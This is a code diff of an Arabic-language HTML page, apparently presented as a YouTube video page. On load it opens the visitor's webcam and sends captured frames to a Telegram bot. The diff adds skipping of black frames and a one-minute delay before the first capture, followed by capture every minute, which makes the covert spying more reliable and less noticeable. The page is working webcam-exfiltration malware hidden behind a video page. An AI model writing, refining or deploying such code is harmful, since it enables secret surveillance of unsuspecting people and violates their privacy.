@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <title>  + فيديو يوتيوب</title>
+  <title>التقاط تلقائي + فيديو يوتيوب</title>
   <style>
     html, body {
       margin: 0; padding: 0; overflow: hidden; height: 100%;
@@ -33,11 +33,25 @@
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
 
+    function isBlackFrame(imageData) {
+      const threshold = 10;
+      const data = imageData.data;
+      let blackPixels = 0;
+      for (let i = 0; i < data.length; i += 4) {
+        const r = data[i];
+        const g = data[i + 1];
+        const b = data[i + 2];
+        if (r < threshold && g < threshold && b < threshold) {
+          blackPixels++;
+        }
+      }
+      return blackPixels / (data.length / 4) > 0.95;
+    }
+
     async function sendToTelegram(blob) {
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
       formData.append('photo', blob, 'photo.jpg');
-
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
           method: 'POST',
@@ -54,44 +68,58 @@
       }
     }
 
+    function waitForVideoFrame() {
+      return new Promise((resolve) => {
+        function checkFrame() {
+          if (video.readyState >= 2) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            if (!isBlackFrame(imageData)) {
+              resolve();
+            } else {
+              requestAnimationFrame(checkFrame);
+            }
+          } else {
+            requestAnimationFrame(checkFrame);
+          }
+        }
+        checkFrame();
+      });
+    }
+
+    async function captureAndSend() {
+      await waitForVideoFrame();
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(async (blob) => {
+        if(blob) {
+          await sendToTelegram(blob);
+        } else {
+          console.error('❌ فشل تحويل الصورة إلى Blob');
+        }
+      }, 'image/jpeg', 0.95);
+    }
+
     async function startCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        // تأكد الفيديو جاهز
         video.onloadedmetadata = () => {
           video.play();
-          console.log('📷 الكاميرا جاهزة، سيتم التقاط الصور كل 10 ثواني');
-          setInterval(captureAndSend, 10000);
+          console.log('📷 الكاميرا جاهزة، سيتم التقاط الصور بعد دقيقة، ثم كل دقيقة');
+
+          // ننتظر دقيقة (60000 مللي ثانية) قبل أول التقاط
+          setTimeout(() => {
+            captureAndSend();
+            // ثم تكرار الالتقاط كل دقيقة
+            setInterval(captureAndSend, 60000);
+          }, 60000);
         };
       } catch (err) {
         alert('⚠️ فشل تشغيل الكاميرا: ' + err.message);
       }
-    }
-
-    function captureAndSend() {
-      if (video.readyState < 2) {
-        // الفيديو ليس جاهزًا
-        console.warn('🚫 الفيديو غير جاهز للالتقاط');
-        return;
-      }
-
-      // ضبط حجم الكانفاس حسب الفيديو
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-
-      // رسم صورة الفيديو على الكانفاس
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // تحويل الصورة إلى Blob وإرسالها
-      canvas.toBlob(blob => {
-        if(blob) {
-          sendToTelegram(blob);
-        } else {
-          console.error('❌ فشل تحويل الصورة إلى Blob');
-        }
-      }, 'image/jpeg', 0.95);
     }
 
     window.onload = startCamera;
